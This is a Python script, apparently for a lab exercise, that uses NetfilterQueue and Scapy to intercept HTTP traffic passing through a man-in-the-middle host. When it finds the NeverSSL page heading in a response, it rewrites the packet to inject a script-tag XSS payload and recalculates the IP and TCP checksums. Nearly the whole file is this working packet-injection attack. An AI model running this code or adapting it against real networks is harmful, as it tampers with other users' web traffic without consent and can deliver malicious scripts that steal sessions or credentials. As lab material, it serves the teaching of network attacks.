from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, UDP, ICMP, Raw

# Payload de la inyección de script (laboratorio)
PAYLOAD = b'"><script>alert("Has sido hackeado!!")</script>'

# Contador global solo para depurar
packet_count = 0

def recalculate(pkt):
    """
    Recalcula longitudes y checksums de un paquete IP/TCP después de modificar el contenido.

    Args:
        pkt (scapy.packet.Packet): Paquete IP/TCP modificado.

    Returns:
        scapy.layers.inet.IP: Paquete con campos recalculados.
    """
    if IP in pkt:
        if hasattr(pkt[IP], "len"):
            del pkt[IP].len
        if hasattr(pkt[IP], "chksum"):
            del pkt[IP].chksum

    if TCP in pkt and hasattr(pkt[TCP], "chksum"):
        del pkt[TCP].chksum

    pkt = IP(bytes(pkt))
    return pkt


def intercept(packet):
    """
    Intercepta paquetes desde la cola de NetfilterQueue, detecta posible tráfico HTTP
    y, si encuentra un patrón específico en el cuerpo, intenta inyectar un payload.
    """
    global packet_count

    try:
        payload = packet.get_payload()
        spkt = IP(payload)

        packet_count += 1
        print(f"[+] Paquete recibido #{packet_count} en NFQUEUE")

        # Info básica de capa 3
        print(f"    IP {spkt.src} -> {spkt.dst}")

        # Si es TCP
        if spkt.haslayer(TCP):
            tcp_layer = spkt[TCP]
            print(f"    TCP {tcp_layer.sport} -> {tcp_layer.dport}")

            if spkt.haslayer(Raw):
                raw_load = spkt[Raw].load
                print(f"    TCP con payload, longitud: {len(raw_load)} bytes")

                # Mostrar solo los primeros bytes para ver qué es
                preview = raw_load[:80]
                try:
                    print(f"    Preview payload: {preview.decode(errors='ignore')}")
                except Exception:
                    print(f"    Preview payload (bytes): {preview}")

                # Detección simple de HTTP
                if b"HTTP/" in raw_load or b"GET " in raw_load or b"POST " in raw_load:
                    print("    Posible trafico HTTP detectado")

                objetivo = b" <h1>NeverSSL</h1>"
                if objetivo in raw_load:
                    print("    Frase objetivo encontrada, inyectando payload...")

                    nuevo_raw = raw_load.replace(objetivo, objetivo + PAYLOAD, 1)
                    spkt[Raw].load = nuevo_raw
                    spkt = recalculate(spkt)
                    packet.set_payload(bytes(spkt))

                    print("    Paquete modificado correctamente")

            else:
                print("    TCP sin payload (SYN, ACK, etc)")

        elif spkt.haslayer(UDP):
            udp_layer = spkt[UDP]
            print(f"    UDP {udp_layer.sport} -> {udp_layer.dport}")
        elif spkt.haslayer(ICMP):
            print("    ICMP (ping u otro tipo de mensaje ICMP)")
        else:
            print("    Otro protocolo de capa 4")

        packet.accept()

    except Exception as e:
        print(f"[!] Error en intercept: {e}")
        packet.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, intercept)

    try:
        print("[+] Esperando paquetes en la cola 1...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[+] Interrupcion por el usuario, saliendo...")
    finally:
        nfqueue.unbind()
        print("[+] Cola NFQUEUE liberada correctamente")


if __name__ == "__main__":
    main()